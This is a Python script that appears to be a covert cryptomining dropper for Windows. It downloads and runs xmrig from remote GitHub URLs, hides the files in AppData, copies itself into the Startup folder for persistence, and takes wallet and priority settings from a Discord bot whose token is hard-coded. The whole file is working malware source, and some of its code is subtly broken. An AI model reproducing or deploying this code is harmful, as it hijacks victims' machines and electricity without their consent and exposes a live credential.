import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

import discord
import json
import os
from pathlib import Path
import shutil
import sys
import psutil
import subprocess


intents = discord.Intents.default()
intents.message_content = True
intents.members = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print("We've logged in as: {0.user}".format(client))

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    
    if message.content.startswith("$"):
        if "addr" in message.content:
            list1 = message.content.split()
            new_addr = list1[1]

            path_sh = os.getcwd() + '\\wlt.txt'

            with open(path_sh, 'w') as file:
                file.write(str(new_addr))

            await message.channel.send("Wallet address set to: ")
            await message.channel.send(new_addr)

        if "priority" in message.content:
            list2 = message.content.split()
            priority = list2[1]

            path_pr = os.getcwd() + '\\prt.txt'

            with open(path_pr, 'w') as file:
                file.write(str(priority))

            await message.channel.send("Computation priority set to: ")

            if priority == "low":
                await message.channel.send("Low")
            
            if priority == "bnom":
                await message.channel.send("Below Normal")

            if priority == "nom":
                await message.channel.send("Normal")

            if priority == "anom":
                await message.channel.send("Above Normal")

            if priority == "high":
                await message.channel.send("High")

            if priority == "rltm":
                await message.channel.send("Realtime")

        if "ping" in message.content:
            await message.channel.send("Running!")


def download_file_with_retry(url, filename='', max_retries=5):
    session = requests.Session()
    retries = Retry(total=max_retries, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)

    session.mount('http://', adapter)
    session.mount('https://', adapter)

    if not filename:
        filename = url[url.rfind('/') + 1:]

    with session.get(url, stream=True) as req:
        req.raise_for_status()
            
        with open(filename, 'wb') as f:
            for chunk in req.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                        
    return filename
    

def priority():
    prt = os.getcwd()+'\\prt.txt'

    for proc in psutil.process_iter(['pid', 'name']):
        if 'xmrig.exe' in proc.info['name']:
            pid = proc.info['pid']
            
            try:
                with open(prt, 'r') as file:
                    if os.stat(prt).st_size == 0:
                        print("File priority is empty.")
                    lines = str(file.read)

                    if lines == "low":
                        p = psutil.LOW_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'low'")

                    if lines == "bnom":
                        p = psutil.BELOW_NORMAL_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'below normal'")

                    if lines == "nom":
                        p = psutil.NORMAL_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'normal'")

                    if lines == "anom":
                        p = psutil.ABOVE_NORMAL_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'above normal'")

                    if lines == "high":
                        p = psutil.HIGH_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'high'")

                    if lines == "rltm":
                        p = psutil.REALTIME_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'realtime'")
            except Exception:
                pass

            break


def main():

    global dest_path
    dest_path = 'C:\\Users\\'+os.getlogin()+'\\AppData\\Roaming'
    path = os.getcwd() + '\\xmrig.exe'
    wallet = os.getcwd() + '\\wlt.txt'
    json_file = os.getcwd() + '\\config.json'
    json_open = dest_path + '\\config.json'
    script_name = os.path.basename(sys.argv[0])
    copy_path = Path(os.getcwd()+'\\'+os.path.basename(__file__)).stem
    
    
    if os.path.exists(dest_path + '\\xmrig.exe' or dest_path + '\\config.json'):
        print("Files already exist.")
    else:
        rig_url = 'https://github.com/DevSpill/miner/raw/main/xmrig.exe'
        config_url = 'https://raw.githubusercontent.com/ptristan88/miners/main/config.json'
        download_file_with_retry(rig_url, 'xmrig.exe')
        download_file_with_retry(config_url, 'config.json')


    if os.path.exists(dest_path + '\\xmrig.exe') == False:
        shutil.move(path, dest_path)
    if os.path.exists(dest_path + '\\config.json') == False:
        shutil.move(json_file, dest_path)


    try:
        shutil.copy(os.getcwd() + '\\' + script_name, 'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    except Exception as e:
        print(e)

    try:
        shutil.copy(os.getcwd() + '\\' + copy_path + '.exe', 'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    except Exception as e:
        print(e)
        

    try:
        with open(wallet, 'r') as file:
            if os.stat(wallet).st_size == 0:
                print("File wallet is empty.")
                pass
            else:
                with open(json_open, 'r') as fileee:
                    data = json.load(fileee)
                
                addr = file.read()
                data["pools"][0]["user"] = addr

                with open(json_open, 'w') as filee:
                    json.dump(data, filee, indent=4)


    except Exception as e:
        print(e)
        pass

    subprocess.Popen([dest_path + '\\xmrig.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

if __name__ == "__main__":
    main()
    priority()
    client.run('MTE5MjUwNTMxODIzMjU3MjAzNg.GaboHc.bpBfRinQWYgvKh702p8ijXtQXizgOxBCBV8AV4')